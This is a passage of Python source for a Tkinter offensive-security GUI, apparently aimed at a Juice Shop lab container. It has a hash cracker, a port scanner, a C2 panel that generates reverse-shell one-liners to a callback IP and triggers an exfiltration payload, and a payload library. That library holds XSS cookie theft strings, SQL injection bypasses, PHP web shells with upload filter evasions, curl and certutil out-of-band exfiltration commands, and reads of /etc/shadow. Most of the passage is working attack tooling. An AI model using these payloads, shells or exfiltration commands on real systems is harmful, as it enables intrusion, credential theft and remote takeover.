wb_scroll.config(command=wb_text.yview)

# --- end Wordlist Builder ---

cracker_frame = tk.Frame(cracker_tab)
cracker_frame.pack(pady=20)

tk.Label(cracker_frame, text="Target MD5 Hash:", font=("Arial", 10)).grid(row=0, column=0, sticky="e", pady=5)
cracker_hash_entry = tk.Entry(cracker_frame, width=40)
cracker_hash_entry.grid(row=0, column=1, padx=5, pady=5)

tk.Label(cracker_frame, text="Wordlist:", font=("Arial", 10)).grid(row=1, column=0, sticky="e", pady=5)
cracker_wordlist_entry = tk.Entry(cracker_frame, width=40)
cracker_wordlist_entry.grid(row=1, column=1, padx=5, pady=5)

if os.path.exists("100k_passwords.txt"):
    cracker_wordlist_entry.insert(0, "100k_passwords.txt")

cracker_browse_btn = tk.Button(cracker_frame, text="Browse...", command=browse_cracker_wordlist)
cracker_browse_btn.grid(row=1, column=2, padx=5)

cracker_attack_btn = tk.Button(cracker_frame, text="Start Attack", bg="darkred", fg="white", font=("Arial", 10, "bold"), command=start_cracker_attack)
cracker_attack_btn.grid(row=2, column=1, pady=15)

cracker_result_label = tk.Label(cracker_frame, text="Ready", font=("Arial", 12, "bold"))
cracker_result_label.grid(row=3, column=0, columnspan=3, pady=10)

exfil_status_label = tk.Label(exfil_tab, text="Listener Status: Active", font=("Arial", 12, "bold"), fg="green")
exfil_status_label.pack(pady=(20, 0))

c2_frame = tk.LabelFrame(exfil_tab, text="C2", font=("Arial", 10, "bold"), fg="cyan", bg="#2b2b2b")
c2_frame.pack(pady=5, padx=20, fill="x")

ip_label = tk.Label(c2_frame, text="Callback IP:", bg="#2b2b2b", fg="white")
ip_label.pack(side=tk.LEFT, padx=5)

ip_entry = tk.Entry(c2_frame, width=15, bg="black", fg="cyan", insertbackground="white")
ip_entry.insert(0, "172.17.0.1")
ip_entry.pack(side=tk.LEFT, padx=5)

path_label = tk.Label(c2_frame, text="Payload Path:", bg="#2b2b2b", fg="white")
path_label.pack(side=tk.LEFT, padx=5)

path_entry = tk.Entry(c2_frame, width=20, bg="black", fg="yellow", insertbackground="white")
path_entry.insert(0, "/tmp/netman.js")
path_entry.pack(side=tk.LEFT, padx=5)

def on_task_select(event):
    selection = task_dropdown.get()
    code_snippet = QUICK_TASKS.get(selection, "")
    
    # Detect language based on OS fingerprint caught by Proxy
    is_python = ("Windows" in current_target_os or "Linux" in current_target_os)

    if selection == "Env: List Keys":
        # Python vs JS logic for environment keys
        code_snippet = "print(list(os.environ.keys()))" if is_python else "Object.keys(process.env).join(', ')"
        
    elif selection == "FS: Read File":
        # Generates a template for you to finish in the text box
        code_snippet = "print(open('PATH_HERE').read())" if is_python else "require('fs').readFileSync('PATH_HERE', 'utf8')"

    elif selection == "Python: Reverse Shell":
        # Your auto-detect logic from before
        cb_ip = ip_entry.get()
        if "Windows" in current_target_os:
            code_snippet = f"import socket,subprocess;s=socket.socket();s.connect(('{cb_ip}',4444));subprocess.Popen(['cmd.exe'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"
        else:
            code_snippet = f"import socket,os,subprocess;s=socket.socket();s.connect(('{cb_ip}',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"

    if code_snippet:
        # Wrap the result in the JSON 'envelope' for the payloads
        json_payload = f'{{"code": "{code_snippet}"}}'
        c2_input.delete(0, tk.END)
        c2_input.insert(0, json_payload)

task_dropdown = ttk.Combobox(c2_frame, values=list(QUICK_TASKS.keys()), state="readonly", width=18)
task_dropdown.current(0)
task_dropdown.pack(side=tk.LEFT, padx=5)

task_dropdown.bind("<<ComboboxSelected>>", on_task_select)

c2_instr = tk.Label(c2_frame, text="Enter JSON Task (e.g. {'code': '2+2'}):", bg="#2b2b2b", fg="white")
c2_instr.pack(side=tk.LEFT, padx=10, pady=10)

c2_input = tk.Entry(c2_frame, width=40, bg="black", fg="limegreen", insertbackground="white")
c2_input.insert(0, '{"code": "2 + 2"}')
c2_input.pack(side=tk.LEFT, padx=5, pady=5, expand=True, fill="x")

def set_task():
    task_data = c2_input.get()
    try:
        with open("task.json", "w") as f:
            f.write(task_data)
        exfil_text.insert(tk.END, f"[+] C2 Task Updated: {task_data}\n")
        exfil_text.see(tk.END)
    except Exception as e:
        exfil_text.insert(tk.END, f"[!] Error saving task: {e}\n")

target_type_var = tk.StringVar(value="JS/Docker") # Default to your current setup

def trigger_payload():
    target_ip = ip_entry.get()
    target_path = path_entry.get()
    if target_type_var.get() == "JS/Docker":
        # Your original JS trigger for Juice Shop
        container_id = "65edd3bb2afc"
        
    if target_type_var.get() == "JS/Docker":
        cmd = f"docker exec -d {container_id} /nodejs/bin/node {target_path} http://{target_ip}:8080/exfil"
    else:
        cmd = f"python3 {target_path}" 
        
    try:
        subprocess.Popen(cmd, shell=True)
        exfil_text.insert(tk.END, f"[*] Trigger Sent ({target_type_var.get()}) to {target_ip}!\n")
    except Exception as e:
        exfil_text.insert(tk.END, f"[!] Trigger Failed: {e}\n")

def clear_task():
    idle_cmd = '{"code": "undefined"}' 
    try:
        with open("task.json", "w") as f:
            f.write(idle_cmd)
        c2_input.delete(0, tk.END)
        c2_input.insert(0, idle_cmd)
        exfil_text.insert(tk.END, "[*] C2 Task Cleared (Idle Mode)\n")
    except Exception as e:
        exfil_text.insert(tk.END, f"[!] Error clearing task: {e}\n")
        
def generate_payload():
    target_ip = ip_entry.get()
    try:
        with open("payload.py", "r") as f:
            content = f.read()
        
        new_content = content.replace("REPLACE_ME", target_ip)
        
        with open("payload_ready.py", "w") as f:
            f.write(new_content)
            
        exfil_text.insert(tk.END, f"[+] Payload generated for {target_ip}: payload_ready.py\n")
        exfil_text.see(tk.END)
    except Exception as e:
        exfil_text.insert(tk.END, f"[!] Generation failed: {e}\n")

gen_btn = tk.Button(c2_frame, text="GENERATE", command=generate_payload, 
                    bg="purple", fg="white", font=("Arial", 9, "bold"), width=10)
gen_btn.pack(side=tk.LEFT, padx=2)

# Radiobuttons to toggle between JS/Docker and Python/VM
type_frame = tk.Frame(c2_frame, bg="#2b2b2b")
type_frame.pack(side=tk.LEFT, padx=10)

tk.Radiobutton(type_frame, text="JS/Docker", variable=target_type_var, value="JS/Docker", 
               bg="#2b2b2b", fg="white", selectcolor="black").pack(side=tk.LEFT)
tk.Radiobutton(type_frame, text="Python/VM", variable=target_type_var, value="Python/VM", 
               bg="#2b2b2b", fg="white", selectcolor="black").pack(side=tk.LEFT)

start_btn = tk.Button(c2_frame, text="START", command=trigger_payload,
                     bg="#b22222", fg="white", font=("Arial", 9, "bold"), width=8)
start_btn.pack(side=tk.LEFT, padx=2)

task_btn = tk.Button(c2_frame, text="TASK", command=set_task, 
                     bg="#444", fg="white", font=("Arial", 9, "bold"), width=8)
task_btn.pack(side=tk.LEFT, padx=2)

clear_btn = tk.Button(c2_frame, text="CLEAR", command=clear_task, 
                      bg="#555", fg="white", font=("Arial", 9, "bold"), width=8)
clear_btn.pack(side=tk.LEFT, padx=2)

exfil_text_frame = tk.Frame(exfil_tab)
exfil_text_frame.pack(fill='both', expand=True, padx=10, pady=10)

exfil_scroll = tk.Scrollbar(exfil_text_frame)
exfil_scroll.pack(side=tk.RIGHT, fill=tk.Y)

exfil_text = tk.Text(exfil_text_frame, height=18, bg="black", fg="limegreen", font=("Consolas", 11), yscrollcommand=exfil_scroll.set)
exfil_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

exfil_scroll.config(command=exfil_text.yview)

exfil_text.insert(tk.END, "[*] NetMan Exfil Listener Active...\n[*] Waiting for netman.local payloads...\n\n")

exploit_label = tk.Label(exploit_tab, text="Universal Exploit Generator", font=("Arial", 12, "bold"))
exploit_label.pack(pady=10)

exploit_url_frame = tk.Frame(exploit_tab)
exploit_url_frame.pack(pady=5)

common_payloads = {
    "Basic XSS": "<script>alert(1)</script>",
    "Image Error XSS": "<img src=x onerror=alert(document.cookie)>",
    "NetMan Custom Tag (Focus)": "<netman id=x tabindex=1 onfocus=alert(document.cookie)>#x",
    "SQLi: Auth Bypass": "' OR 1=1--",
    "SQLi: Union Column Discovery": "' UNION SELECT NULL,NULL,NULL--",
    "SQLi: Version Grab (MySQL)": "' UNION SELECT @@version,NULL--",
    "SQLi: Sleep (Time-Based)": "'; WAITFOR DELAY '0:0:5'--",
    "SQLi: Version Grab (PostgreSQL)": "' UNION SELECT version(), NULL--",
    "SQLi: Version Grab (Oracle - Banner)": "' UNION SELECT banner, NULL FROM v$version--",
    "SQLi: Version Grab (Oracle - Instance)": "' UNION SELECT version, NULL FROM v$instance--",
    "SQLi: Union Column Discovery (Oracle)": "' UNION SELECT NULL,NULL FROM dual--",
    "PHP: Simple Web Shell": "<?php echo system($_GET['command']); ?>",
    "PHP: Short Echo Tag (Filter Bypass)": "<?= system($_GET['cmd']); ?>",
    "PHP: shell_exec Variant": "<?php echo shell_exec($_GET['cmd']); ?>",
    "PHP: passthru Variant": "<?php passthru($_GET['cmd']); ?>",
    "PHP: MIME Bypass (JPEG Header + Shell)": "\xff\xd8\xff\xe0<?php echo system($_GET['cmd']); ?>",
    "PHP: Double Extension (.php.jpg)": "<?php echo system($_GET['cmd']); ?> [rename: shell.php.jpg]",
    "PHP: Null Byte Extension (Legacy)": "<?php echo system($_GET['cmd']); ?> [filename: shell.php%00.jpg]",
    "PHP: POST-Based Shell": "<?php echo system($_POST['cmd']); ?>",
    "PHP: Obfuscated (base64 eval)": "<?php eval(base64_decode($_GET['cmd'])); ?>",
    "PHP: system() via Variable Function": "<?php $f='system'; $f($_GET['cmd']); ?>",
    "PHP: System via Backticks": "<?php echo `whoami`; ?>",
    "PHP: Multi-Command (&&)": "1 && whoami",
    "OS: OOB - Whoami (Linux)": f"& curl https://{_oob_host}/exfil?c=$(whoami|base64) &",
    "OS: OOB - Hostname (Linux)": f"& curl https://{_oob_host}/exfil?c=$(hostname|base64) &",
    "OS: OOB - Current Dir (Linux)": f"& curl https://{_oob_host}/exfil?c=$(pwd|base64) &",
    "OS: OOB - OS Info (Linux)": f"& curl https://{_oob_host}/exfil?c=$(uname -a|base64) &",
    "OS: OOB - Network (Linux)": f"& curl https://{_oob_host}/exfil?c=$(hostname -I|base64) &",
    "OS: OOB - Windows Ping Check": f"& certutil -urlcache -f https://{_oob_host}/exfil?c=V2luZG93c19Db25maXJtZWQ= &",
    "OS: Universal - Time Delay (Ping)": "& ping -c 10 127.0.0.1 || ping -n 10 127.0.0.1 &",
    "OS: Linux - Whoami": "whoami",
    "OS: Linux - Inline Exec (Backticks)": "`whoami` #",
    "OS: Linux - Inline Exec (Dollar)": "$(whoami) #",
    "OS: Linux - Space Bypass (${IFS})": "whoami${IFS}-a",
    "OS: Linux - Filter Bypass (Newline)": "%0awhoami%0a",
    "OS: Linux - Current Directory": "pwd",
    "OS: Linux - List Files": "ls -la",
    "OS: Linux - Read /etc/passwd": "cat /etc/passwd",
    "OS: Linux - Hostname": "hostname",
    "OS: Linux - Network Interfaces": "ifconfig || ip a",
    "OS: Linux - Running Processes": "ps aux",
    "OS: Linux - Active Connections": "netstat -antp 2>/dev/null || ss -antp",
    "OS: Linux - Find SUID Binaries": "find / -perm -4000 -type f 2>/dev/null",
    "OS: Linux - Read /etc/shadow (root)": "cat /etc/shadow",
    "OS: Linux - Environment Variables": "env",
    "OS: Linux - Cron Jobs": "cat /etc/crontab",
    "OS: Linux - OS Version": "uname -a && cat /etc/os-release",
    "OS: Windows - Whoami": "whoami",
    "OS: Windows - System Info": "systeminfo",
    "OS: Windows - List Directory": "dir C:\\",
    "OS: Windows - Network Config": "ipconfig /all",
    "OS: Windows - Running Processes": "tasklist",
    "OS: Windows - Active Connections": "netstat -ano",
    "OS: Windows - Users": "net user",
    "OS: Windows - Local Admins": "net localgroup administrators",
    "OS: Windows - Read Hosts File": "type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "OS: Windows - Environment Variables": "set",
    "OS: Windows - Scheduled Tasks": "schtasks /query /fo LIST"
    }

tk.Label(exploit_url_frame, text="Target URL:", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)
exploit_url_entry = tk.Entry(exploit_url_frame, width=60)
exploit_url_entry.pack(side=tk.LEFT, padx=5)
exploit_url_entry.bind("<Button-3>", show_right_click_menu)

exploit_payload_frame = tk.Frame(exploit_tab)
exploit_payload_frame.pack(pady=5)

tk.Label(exploit_payload_frame, text="Payload:", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)
exploit_payload_entry = tk.Entry(exploit_payload_frame, width=60)
exploit_payload_entry.pack(side=tk.LEFT, padx=5)
exploit_payload_entry.bind("<Button-3>", show_right_click_menu)

payload_dropdown_frame =tk.Frame(exploit_tab)
payload_dropdown_frame.pack(pady=5)

transform_frame = tk.Frame(exploit_tab)
transform_frame.pack(pady=5)

tk.Label(transform_frame, text="Encoding:", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)
transform_var = tk.StringVar(value="None")
transform_menu = ttk.Combobox(transform_frame, textvariable=transform_var, values=["None", "Base64", "MD5 Hash", "URL Encode"], state="readonly")
transform_menu.pack(side=tk.LEFT, padx=5)

exploit_gen_btn = tk.Button(exploit_tab, text="Generate Iframe", bg="darkgreen", fg="white", font=("Arial", 10, "bold"), command=generate_iframe)
exploit_gen_btn.pack(pady=10)

exploit_copy_btn = tk.Button(exploit_tab, text="Copy to Clipboard", bg="darkblue", fg="white", font=("Arial", 10, "bold"), command=copy_exploit_to_clipboard)
exploit_copy_btn.pack(pady=5)

tk.Label(payload_dropdown_frame, text="Quick Select", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)

payload_dropdown = ttk.Combobox(payload_dropdown_frame, values=list(common_payloads.keys()), state="readonly", width=57)
payload_dropdown.pack(side=tk.LEFT, padx=5)

payload_dropdown.bind("<<ComboboxSelected>>", load_selected_payload)

comment_frame = tk.Frame(exploit_tab)
comment_frame.pack(pady=5)

tk.Label(comment_frame, text="SQL Comment Style:", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)
comment_style_var = tk.StringVar(value="--")
tk.Radiobutton(comment_frame, text="-- (Standard)", variable=comment_style_var, value="--").pack(side=tk.LEFT)
tk.Radiobutton(comment_frame, text="# (MySQL/Bypass)", variable=comment_style_var, value="#").pack(side=tk.LEFT)

exploit_gen_btn = tk.Button(exploit_tab, text="Generate Iframe", bg="darkgreen", fg="white", font=("Arial", 10, "bold"), command=generate_iframe)
exploit_gen_btn.pack(pady=10)

tk.Label(exploit_tab, text="Generated Exploit Code:", font=("Arial", 10)).pack(pady=5)
exploit_output = tk.Text(exploit_tab, height=8)
exploit_output.pack(fill='both', expand=True, padx=10, pady=5)

scanner_label = tk.Label(scanner_tab, text="Network Port Scanner", font=("Arial", 12, "bold"))
scanner_label.pack(pady=10)

scanner_target_frame = tk.Frame(scanner_tab)
scanner_target_frame.pack(pady=5)

tk.Label(scanner_target_frame, text="Target IP / URL:", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)

scanner_target_entry = tk.Entry(scanner_target_frame, width=40)
scanner_target_entry.pack(side=tk.LEFT, padx=5)

scanner_target_entry.bind("<Button-3>", show_right_click_menu)

scanner_ports_frame = tk.Frame(scanner_tab)
scanner_ports_frame.pack(pady=5)

tk.Label(scanner_ports_frame, text="Ports:", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)

scanner_ports_entry = tk.Entry(scanner_ports_frame, width=40)
scanner_ports_entry.pack(side=tk.LEFT, padx=5)

scanner_ports_entry.insert(0, "21, 22, 80, 443, 8080, 8082")

scanner_ports_entry.bind("<Button-3>", show_right_click_menu)

scanner_timeout_frame = tk.Frame(scanner_tab)
scanner_timeout_frame.pack(pady=5)

tk.Label(scanner_timeout_frame, text="Timeout (Seconds):", font=("Arial", 10)).pack(side=tk.LEFT, padx=5)

scanner_timeout_entry = tk.Entry(scanner_timeout_frame, width=40)
scanner_timeout_entry.pack(side=tk.LEFT, padx=5)

scanner_timeout_entry.insert(0, "1.0")

scanner_timeout_entry.bind("<Button-3>", show_right_click_menu)

scanner_btn = tk.Button(scanner_tab, text="Start Scan", bg="darkred", fg="white", font=("Arial", 10, "bold"), command=start_port_scan)
scanner_btn.pack(pady=10)

tk.Label(scanner_tab, text="Scan Results:", font=("Arial", 10)).pack(pady=5)

scanner_output = tk.Text(scanner_tab, height=12)
scanner_output.pack(fill='both', expand=True, padx=10, pady=5)

def check_exfil_queue():
    try:
        while True:
            data = mitm_proxy.exfil_queue.get_nowait()
            exfil_text.insert(tk.END, f"[$$$] NEW HIT: {data}\n")
            # Agent: observe exfiltrated data and summarise risk
            agent.observe_exfil(data)
            global current_target_os
            if "OS: Windows" in data:
                current_target_os = "Windows"
                exfil_text.insert(tk.END, "[*] OS Detected: Windows\n")
            elif "OS: Linux" in data:
                current_target_os = "Linux"
                exfil_text.insert(tk.END, "[*] OS Detected: Linux\n")
            exfil_text.see(tk.END)
            exfil_status_label.config(text="Listener Status: Payload Caught!", fg="red")
            app.after(3000, lambda: exfil_status_label.config(text="Listener Status: Active", fg="green"))
    except queue.Empty:
        pass
    app.after(1000, check_exfil_queue)

check_exfil_queue()

repeater_text.bind("<Control-u>", quick_url_encode)
intruder_text.bind("<Control-u>", quick_url_encode)

repeater_text.bind("<Control-Shift-U>", quick_url_decode)
intruder_text.bind("<Control-Shift-U>", quick_url_decode)

repeater_text.bind("<Control-b>", quick_b64_encode)
repeater_text.bind("<Control-Shift-B>", quick_b64_decode)
repeater_text.bind("<Control-h>", quick_html_encode)
repeater_text.bind("<Control-Shift-H>", quick_html_decode)

intruder_text.bind("<Control-b>", quick_b64_encode)
intruder_text.bind("<Control-Shift-B>", quick_b64_decode)
intruder_text.bind("<Control-h>", quick_html_encode)
intruder_text.bind("<Control-Shift-H>", quick_html_decode)

if __name__ == "__main__":
    app.protocol("WM_DELETE_WINDOW", on_app_close)
    load_initial_history()
    check_for_new_traffic()
    check_intercept_queue()
    check_intruder_queue()
    app.mainloop()